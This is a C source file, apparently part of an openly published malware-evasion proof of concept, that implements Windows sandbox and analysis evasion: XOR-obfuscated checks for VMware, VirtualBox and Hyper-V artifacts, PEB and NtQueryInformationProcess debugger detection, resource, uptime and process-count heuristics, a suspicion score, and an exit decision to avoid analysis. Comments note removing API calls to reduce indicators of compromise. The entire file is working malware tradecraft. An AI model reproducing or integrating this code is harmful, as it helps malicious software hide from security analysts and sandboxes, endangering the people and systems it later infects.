/*
 * Author: 28Zaakypro@proton.me
 * Based on: https://github.com/28Zaaky/Malware-Evasion-PoC
 * Sandbox Evasion - Detects VMs, debuggers, low resources, and automated analysis
 * Checks for VMware/VirtualBox/Hyper-V, debugger presence, uptime, process count
 */

#include "sandbox_evasion.h"
#include "obfuscation.h"
#include <tlhelp32.h>
#include <winternl.h>
#include "syscalls.h"

// Checks for VM artifacts (registry keys, drivers, CPUID)
BOOL CheckVirtualMachine() {
    BOOL isVM = FALSE;
    
    #ifndef PRODUCTION
    printf("[*] Checking for VM...\n");
    #endif
    
    // Check VMware registry
    HKEY hKey;
    BYTE obfVMwareKey[] = {0x31, 0x2F, 0x24, 0x32, 0x77, 0x03, 0x30, 0x05, 0x5E, 0x16, 0x2D, 0x34, 0x23, 0x30, 0x27, 0x6C, 0x22, 0x09, 0x2C, 0x21, 0x00, 0x5E, 0x16, 0x2D, 0x34, 0x23, 0x30, 0x27, 0x22, 0x32, 0x2E, 0x2E, 0x2E, 0x2B};
    char vmwareKey[64];
    DeobfuscateString(obfVMwareKey, 34, 0x42, vmwareKey);
    
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, vmwareKey, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        #ifndef PRODUCTION
        printf("    [!] VMware Tools Detected\n");
        #endif
        isVM = TRUE;
        RegCloseKey(hKey);
    }
    
    // Check VirtualBox
    BYTE obfVBoxKey[] = {0x31, 0x2F, 0x24, 0x32, 0x77, 0x03, 0x30, 0x05, 0x5E, 0x2F, 0x30, 0x23, 0x21, 0x2E, 0x27, 0x5E, 0x16, 0x2A, 0x30, 0x32, 0x33, 0x23, 0x2E, 0x04, 0x2E, 0x38, 0x22, 0x07, 0x33, 0x27, 0x2B, 0x32, 0x22, 0x03, 0x26, 0x26, 0x2A, 0x32, 0x2A, 0x2E, 0x2C, 0x2B};
    char vboxKey[64];
    DeobfuscateString(obfVBoxKey, 42, 0x42, vboxKey);
    
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, vboxKey, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        #ifndef PRODUCTION
        printf("    [!] VirtualBox Detected\n");
        #endif
        isVM = TRUE;
        RegCloseKey(hKey);
    }
    
    // Check Hyper-V
    BYTE obfHyperVKey[] = {0x31, 0x2F, 0x24, 0x32, 0x77, 0x03, 0x30, 0x05, 0x5E, 0x2D, 0x2A, 0x21, 0x30, 0x2E, 0x2B, 0x2E, 0x24, 0x32, 0x5E, 0x16, 0x2A, 0x30, 0x32, 0x33, 0x23, 0x2E, 0x22, 0x2D, 0x23, 0x21, 0x2A, 0x2C, 0x27, 0x5E, 0x07, 0x33, 0x27, 0x2B, 0x32, 0x5E, 0x10, 0x23, 0x30, 0x23, 0x2D, 0x27, 0x32, 0x27, 0x30, 0x2B};
    char hyperVKey[64];
    DeobfuscateString(obfHyperVKey, 49, 0x42, hyperVKey);
    
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, hyperVKey, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        #ifndef PRODUCTION
        printf("    [!] Hyper-V Detected\n");
        #endif
        isVM = TRUE;
        RegCloseKey(hKey);
    }
    
    // Check VM driver files (obfuscated paths - XOR 0x42)
    // Original: vmmouse.sys, vmhgfs.sys, VBoxMouse.sys, VBoxGuest.sys, vmci.sys
    BYTE obfPaths[][60] = {
        {0x01, 0x7A, 0x5E, 0x77, 0x2A, 0x2C, 0x26, 0x2E, 0x2D, 0x33, 0x5E, 0x31, 0x39, 0x2B, 0x32, 0x27, 0x2D, 0x71, 0x70, 0x5E, 0x26, 0x30, 0x2A, 0x34, 0x27, 0x30, 0x2B, 0x5E, 0x34, 0x2D, 0x2D, 0x2E, 0x2D, 0x33, 0x2B, 0x27, 0x00, 0x2B, 0x39, 0x2B},
        {0x01, 0x7A, 0x5E, 0x77, 0x2A, 0x2C, 0x26, 0x2E, 0x2D, 0x33, 0x5E, 0x31, 0x39, 0x2B, 0x32, 0x27, 0x2D, 0x71, 0x70, 0x5E, 0x26, 0x30, 0x2A, 0x34, 0x27, 0x30, 0x2B, 0x5E, 0x34, 0x2D, 0x2A, 0x2C, 0x2E, 0x24, 0x2B, 0x00, 0x2B, 0x39, 0x2B},
        {0x01, 0x7A, 0x5E, 0x77, 0x2A, 0x2C, 0x26, 0x2E, 0x2D, 0x33, 0x5E, 0x31, 0x39, 0x2B, 0x32, 0x27, 0x2D, 0x71, 0x70, 0x5E, 0x26, 0x30, 0x2A, 0x34, 0x27, 0x30, 0x2B, 0x5E, 0x16, 0x04, 0x2E, 0x38, 0x2D, 0x2E, 0x33, 0x2B, 0x27, 0x00, 0x2B, 0x39, 0x2B},
        {0x01, 0x7A, 0x5E, 0x77, 0x2A, 0x2C, 0x26, 0x2E, 0x2D, 0x33, 0x5E, 0x31, 0x39, 0x2B, 0x32, 0x27, 0x2D, 0x71, 0x70, 0x5E, 0x26, 0x30, 0x2A, 0x34, 0x27, 0x30, 0x2B, 0x5E, 0x16, 0x04, 0x2E, 0x38, 0x07, 0x33, 0x27, 0x2B, 0x32, 0x00, 0x2B, 0x39, 0x2B},
        {0x01, 0x7A, 0x5E, 0x77, 0x2A, 0x2C, 0x26, 0x2E, 0x2D, 0x33, 0x5E, 0x31, 0x39, 0x2B, 0x32, 0x27, 0x2D, 0x71, 0x70, 0x5E, 0x26, 0x30, 0x2A, 0x34, 0x27, 0x30, 0x2B, 0x5E, 0x34, 0x2D, 0x21, 0x2A, 0x00, 0x2B, 0x39, 0x2B}
    };
    
    for (int i = 0; i < 5; i++) {
        char path[60];
        SIZE_T len = 0;
        while (obfPaths[i][len] != 0) len++;
        DeobfuscateString(obfPaths[i], len, 0x42, path);
        
        if (GetFileAttributesA(path) != INVALID_FILE_ATTRIBUTES) {
            #ifndef PRODUCTION
            printf("    [!] VM Driver Found : %s\n", path);
            #endif
            isVM = TRUE;
        }
    }
    
    if (isVM) {
        #ifndef PRODUCTION
        printf("    [SANDBOX] VM Detected !\n");
        #endif
    } else {
        #ifndef PRODUCTION
        printf("    [OK] No VM Detected\n");
        #endif
    }
    
    return isVM;
}

// ============================================================================
// DÉTECTION DE DEBUGGER
// ============================================================================

/*
 * CheckDebugger
 * -------------
 * Vérifie si un debugger est attaché au processus.
 * 
 * MÉTHODES :
 * - IsDebuggerPresent()
 * - CheckRemoteDebuggerPresent()
 * - PEB flags (Process Environment Block)
 * - NtQueryInformationProcess
 */

BOOL CheckDebugger() {
    BOOL isDebugged = FALSE;
    
    #ifndef PRODUCTION
    printf("[*] Vérification de debugger...\n");
    #endif
    
    // ========================================================================
    // MÉTHODE 1 : IsDebuggerPresent() - COMMENTED OUT (reduces IoCs)
    // ========================================================================
    /*
    if (IsDebuggerPresent()) {
        #ifndef PRODUCTION
        printf("    [!] IsDebuggerPresent() = TRUE\n");
        #endif
        isDebugged = TRUE;
    }
    */
    
    // ========================================================================
    // MÉTHODE 2 : CheckRemoteDebuggerPresent() - COMMENTED OUT (reduces IoCs)
    // ========================================================================
    /*
    BOOL remoteDebugger = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &remoteDebugger);
    if (remoteDebugger) {
        #ifndef PRODUCTION
        printf("    [!] Remote debugger détecté\n");
        #endif
        isDebugged = TRUE;
    }
    */
    
    // ========================================================================
    // MÉTHODE 3 : Vérifier le PEB (Process Environment Block)
    // ========================================================================
    // Le PEB contient un flag BeingDebugged
    
    #ifdef _WIN64
    PPEB peb = (PPEB)__readgsqword(0x60);  // GS:[0x60] contient le PEB en x64
    #else
    PPEB peb = (PPEB)__readfsdword(0x30);  // FS:[0x30] contient le PEB en x86
    #endif
    
    if (peb && peb->BeingDebugged) {
        #ifndef PRODUCTION
        printf("    [!] PEB.BeingDebugged = TRUE\n");
        #endif
        isDebugged = TRUE;
    }
    
    // ========================================================================
    // MÉTHODE 4 : NtQueryInformationProcess
    // ========================================================================
    typedef NTSTATUS (WINAPI *pNtQueryInformationProcess)(
        HANDLE ProcessHandle,
        DWORD ProcessInformationClass,
        PVOID ProcessInformation,
        ULONG ProcessInformationLength,
        PULONG ReturnLength
    );
    
    // Obfuscated strings (XOR 0x42)
    BYTE obfNtdll[] = {0x2C, 0x36, 0x26, 0x2E, 0x2E, 0x6C, 0x26, 0x2E, 0x2E};
    BYTE obfNtQuery[] = {0x2C, 0x32, 0x11, 0x33, 0x27, 0x30, 0x39, 0x09, 0x2C, 0x24, 0x2E, 0x30, 0x2D, 0x23, 0x32, 0x2A, 0x2E, 0x2C, 0x10, 0x30, 0x2E, 0x21, 0x27, 0x2B, 0x2B};
    char ntdll[16], ntQuery[32];
    DeobfuscateString(obfNtdll, 9, 0x42, ntdll);
    DeobfuscateString(obfNtQuery, 25, 0x42, ntQuery);
    
    HMODULE hNtdll = GetModuleHandleA(ntdll);
    pNtQueryInformationProcess NtQueryInformationProcess = 
        (pNtQueryInformationProcess)GetProcAddress(hNtdll, ntQuery);
    
    if (NtQueryInformationProcess) {
        DWORD debugPort = 0;
        NTSTATUS status = NtQueryInformationProcess(
            GetCurrentProcess(),
            7,  // ProcessDebugPort
            &debugPort,
            sizeof(debugPort),
            NULL
        );
        
        if (status == 0 && debugPort != 0) {
            #ifndef PRODUCTION
            printf("    [!] Debug port detected\n");
            #endif
            isDebugged = TRUE;
        }
    }
    
    if (isDebugged) {
        #ifndef PRODUCTION
        printf("    [SANDBOX] Debugger détecté !\n");
        #endif
    } else {
        #ifndef PRODUCTION
        printf("    [OK] Pas de debugger détecté\n");
        #endif
    }
    
    return isDebugged;
}

// ============================================================================
// VÉRIFICATION DES RESSOURCES SYSTÈME
// ============================================================================

/*
 * CheckSystemResources
 * --------------------
 * Vérifie si les ressources système sont cohérentes avec un système réel.
 * Les sandboxes ont souvent peu de ressources.
 * 
 * VÉRIFICATIONS :
 * - Nombre de CPUs (< 2 = suspect)
 * - RAM totale (< 4GB = suspect)
 * - Espace disque (< 80GB = suspect)
 */
BOOL CheckSystemResources() {
    BOOL lowResources = FALSE;
    
    #ifndef PRODUCTION
    printf("[*] Vérification des ressources système...\n");
    #endif
    
    // ========================================================================
    // VÉRIFIER LE NOMBRE DE CPUS
    // ========================================================================
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    
    #ifndef PRODUCTION
    printf("    • Nombre de CPUs : %d\n", sysInfo.dwNumberOfProcessors);
    #endif
    
    if (sysInfo.dwNumberOfProcessors < 2) {
        #ifndef PRODUCTION
        printf("      [!] Moins de 2 CPUs = suspect\n");
        #endif
        lowResources = TRUE;
    }
    
    // ========================================================================
    // VÉRIFIER LA RAM
    // ========================================================================
    MEMORYSTATUSEX memStatus;
    memStatus.dwLength = sizeof(memStatus);
    GlobalMemoryStatusEx(&memStatus);
    
    DWORD ramGB = (DWORD)(memStatus.ullTotalPhys / (1024 * 1024 * 1024));
    #ifndef PRODUCTION
    printf("    • RAM totale : %d GB\n", ramGB);
    #endif
    
    if (ramGB < 4) {
        #ifndef PRODUCTION
        printf("      [!] Moins de 4GB RAM = suspect\n");
        #endif
        lowResources = TRUE;
    }
    
    // ========================================================================
    // VÉRIFIER L'ESPACE DISQUE
    // ========================================================================
    ULARGE_INTEGER freeBytesAvailable, totalBytes, totalFreeBytes;
    if (GetDiskFreeSpaceExA("C:\\", &freeBytesAvailable, &totalBytes, &totalFreeBytes)) {
        DWORD diskGB = (DWORD)(totalBytes.QuadPart / (1024 * 1024 * 1024));
        #ifndef PRODUCTION
        printf("    • Espace disque C: : %d GB\n", diskGB);
        #endif
        
        if (diskGB < 80) {
            #ifndef PRODUCTION
            printf("      [!] Moins de 80GB disque = suspect\n");
            #endif
            lowResources = TRUE;
        }
    }
    
    if (lowResources) {
        #ifndef PRODUCTION
        printf("    [SANDBOX] Ressources faibles détectées !\n");
        #endif
    } else {
        #ifndef PRODUCTION
        printf("    [OK] Ressources normales\n");
        #endif
    }
    
    return lowResources;
}

// ============================================================================
// VÉRIFICATION DE L'UPTIME
// ============================================================================

/*
 * CheckUptime
 * -----------
 * Vérifie depuis combien de temps le système tourne.
 * Les sandboxes redémarrent souvent (uptime faible).
 * 
 * CRITÈRE : Uptime < 10 minutes = suspect
 */
BOOL CheckUptime() {
    #ifndef PRODUCTION
    printf("[*] Vérification de l'uptime système...\n");
    #endif
    
    DWORD uptime = GetTickCount64() / 1000;  // En secondes
    DWORD minutes = uptime / 60;
    DWORD hours = minutes / 60;
    
    #ifndef PRODUCTION
    printf("    • Uptime : %d heures %d minutes\n", hours, minutes % 60);
    #endif
    
    if (minutes < 10) {
        #ifndef PRODUCTION
        printf("      [!] Uptime < 10 minutes = suspect (sandbox récemment démarrée)\n");
        #endif
        #ifndef PRODUCTION
        printf("    [SANDBOX] Uptime faible détecté !\n");
        #endif
        return TRUE;
    }
    
    #ifndef PRODUCTION
    printf("    [OK] Uptime normal\n");
    #endif
    return FALSE;
}

// ============================================================================
// DÉTECTION D'ACTIVITÉ UTILISATEUR
// ============================================================================

/*
 * CheckUserActivity
 * -----------------
 * Vérifie s'il y a des traces d'activité utilisateur réelle.
 * Les sandboxes ont peu de fichiers/processus utilisateur.
 * 
 * VÉRIFICATIONS :
 * - Fichiers récents
 * - Historique navigateur
 * - Temps d'inactivité
 */
BOOL CheckUserActivity() {
    #ifndef PRODUCTION
    printf("[*] Vérification de l'activité utilisateur...\n");
    #endif
    
    // ========================================================================
    // VÉRIFIER LES FICHIERS RÉCENTS
    // ========================================================================
    WIN32_FIND_DATAA findData;
    HANDLE hFind = FindFirstFileA("C:\\Users\\*", &findData);
    int userCount = 0;
    
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                if (strcmp(findData.cFileName, ".") != 0 && 
                    strcmp(findData.cFileName, "..") != 0 &&
                    strcmp(findData.cFileName, "Public") != 0 &&
                    strcmp(findData.cFileName, "Default") != 0) {
                    userCount++;
                }
            }
        } while (FindNextFileA(hFind, &findData));
        FindClose(hFind);
    }
    
    #ifndef PRODUCTION
    printf("    • Nombre de profils utilisateur : %d\n", userCount);
    #endif
    
    if (userCount < 1) {
        #ifndef PRODUCTION
        printf("      [!] Aucun profil utilisateur = suspect\n");
        #endif
        #ifndef PRODUCTION
        printf("    [SANDBOX] Peu d'activité utilisateur !\n");
        #endif
        return TRUE;
    }
    
    // ========================================================================
    // VÉRIFIER LE TEMPS D'INACTIVITÉ
    // ========================================================================
    LASTINPUTINFO lii;
    lii.cbSize = sizeof(LASTINPUTINFO);
    GetLastInputInfo(&lii);
    
    DWORD idleTime = (GetTickCount() - lii.dwTime) / 1000;  // En secondes
    #ifndef PRODUCTION
    printf("    • Temps d'inactivité : %d secondes\n", idleTime);
    #endif
    
    // Dans une sandbox automatisée, il n'y a souvent aucune interaction
    // Mais on ne considère pas cela comme critère principal
    
    #ifndef PRODUCTION
    printf("    [OK] Activité utilisateur détectée\n");
    #endif
    return FALSE;
}

// ============================================================================
// COMPTAGE DES PROCESSUS
// ============================================================================

/*
 * CheckProcessCount
 * -----------------
 * Compte le nombre de processus en cours d'exécution.
 * Les sandboxes ont généralement peu de processus (20-50).
 * Un système réel en a facilement 100+.
 */
BOOL CheckProcessCount() {
    #ifndef PRODUCTION
    printf("[*] Comptage des processus...\n");
    #endif
    
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        #ifndef PRODUCTION
        printf("    [!] Impossible de créer le snapshot\n");
        #endif
        return FALSE;
    }
    
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    
    int processCount = 0;
    
    if (Process32First(hSnapshot, &pe32)) {
        do {
            processCount++;
        } while (Process32Next(hSnapshot, &pe32));
    }
    
    CloseHandle(hSnapshot);  // Utiliser CloseHandle standard, pas SysCloseHandle
    
    #ifndef PRODUCTION
    printf("    • Nombre de processus : %d\n", processCount);
    #endif
    
    if (processCount < 50) {
        #ifndef PRODUCTION
        printf("      [!] Moins de 50 processus = suspect\n");
        #endif
        #ifndef PRODUCTION
        printf("    [SANDBOX] Peu de processus détectés !\n");
        #endif
        return TRUE;
    }
    
    #ifndef PRODUCTION
    printf("    [OK] Nombre de processus normal\n");
    #endif
    return FALSE;
}

// ============================================================================
// FONCTION PRINCIPALE : VÉRIFICATION COMPLÈTE
// ============================================================================

/*
 * CheckSandboxEnvironment
 * -----------------------
 * Exécute toutes les vérifications et calcule un score de suspicion.
 * 
 * SCORE :
 * - Chaque détection positive ajoute des points
 * - Score > 30 = Probablement une sandbox
 * - Score > 50 = Certainement une sandbox
 */
BOOL CheckSandboxEnvironment(EVASION_RESULT* result) {
    #ifndef PRODUCTION
    printf("\n");
    #endif
    #ifndef PRODUCTION
    printf("╔══════════════════════════════════════════════════════╗\n");
    #endif
    #ifndef PRODUCTION
    printf("║       SANDBOX EVASION - VÉRIFICATIONS                ║\n");
    #endif
    #ifndef PRODUCTION
    printf("╚══════════════════════════════════════════════════════╝\n\n");
    #endif
    
    // Initialiser le résultat
    result->isSandbox = FALSE;
    result->isVM = FALSE;
    result->isDebugger = FALSE;
    result->hasLowResources = FALSE;
    result->score = 0;
    
    // Exécuter toutes les vérifications
    result->isVM = CheckVirtualMachine();
    if (result->isVM) result->score += 30;  // VM = très suspect
    
    #ifndef PRODUCTION
    printf("\n");
    #endif
    result->isDebugger = CheckDebugger();
    if (result->isDebugger) result->score += 40;  // Debugger = très suspect
    
    #ifndef PRODUCTION
    printf("\n");
    #endif
    result->hasLowResources = CheckSystemResources();
    if (result->hasLowResources) result->score += 20;
    
    #ifndef PRODUCTION
    printf("\n");
    #endif
    if (CheckUptime()) result->score += 15;
    
    #ifndef PRODUCTION
    printf("\n");
    #endif
    if (CheckUserActivity()) result->score += 10;
    
    #ifndef PRODUCTION
    printf("\n");
    #endif
    if (CheckProcessCount()) result->score += 15;
    
    // Déterminer si c'est une sandbox
    result->isSandbox = (result->score >= 30);
    
    return result->isSandbox;
}

// ============================================================================
// AFFICHAGE DU RÉSULTAT
// ============================================================================

void PrintEvasionResult(EVASION_RESULT* result) {
    #ifndef PRODUCTION
    printf("\n");
    #endif
    #ifndef PRODUCTION
    printf("╔══════════════════════════════════════════════════════╗\n");
    #endif
    #ifndef PRODUCTION
    printf("║       RÉSULTAT DE L'ANALYSE                          ║\n");
    #endif
    #ifndef PRODUCTION
    printf("╚══════════════════════════════════════════════════════╝\n\n");
    #endif
    
    #ifndef PRODUCTION
    printf("  • Machine virtuelle    : %s\n", result->isVM ? "OUI" : "NON");
    #endif
    #ifndef PRODUCTION
    printf("  • Debugger             : %s\n", result->isDebugger ? "OUI" : "NON");
    #endif
    #ifndef PRODUCTION
    printf("  • Ressources faibles   : %s\n", result->hasLowResources ? "OUI" : "NON");
    #endif
    #ifndef PRODUCTION
    printf("  • Score de suspicion   : %d/100\n", result->score);
    #endif
    #ifndef PRODUCTION
    printf("\n");
    #endif
    
    if (result->score >= 50) {
        #ifndef PRODUCTION
        printf("  ⚠️  VERDICT : CERTAINEMENT UNE SANDBOX\n");
        #endif
    } else if (result->score >= 30) {
        #ifndef PRODUCTION
        printf("  ⚠️  VERDICT : PROBABLEMENT UNE SANDBOX\n");
        #endif
    } else {
        #ifndef PRODUCTION
        printf("  ✅ VERDICT : ENVIRONNEMENT RÉEL\n");
        #endif
    }
    
    #ifndef PRODUCTION
    printf("\n");
    #endif
}

// ============================================================================
// DÉCISION : CONTINUER OU SORTIR ?
// ============================================================================

BOOL ShouldExit(EVASION_RESULT* result) {
    // Décider si on doit quitter pour éviter l'analyse
    
    if (result->score >= 50) {
        #ifndef PRODUCTION
        printf("  [DÉCISION] Score trop élevé → EXIT\n");
        #endif
        return TRUE;
    }
    
    if (result->isDebugger) {
        #ifndef PRODUCTION
        printf("  [DÉCISION] Debugger détecté → EXIT\n");
        #endif
        return TRUE;
    }
    
    #ifndef PRODUCTION
    printf("  [DÉCISION] Environnement acceptable → CONTINUER\n");
    #endif
    return FALSE;
}
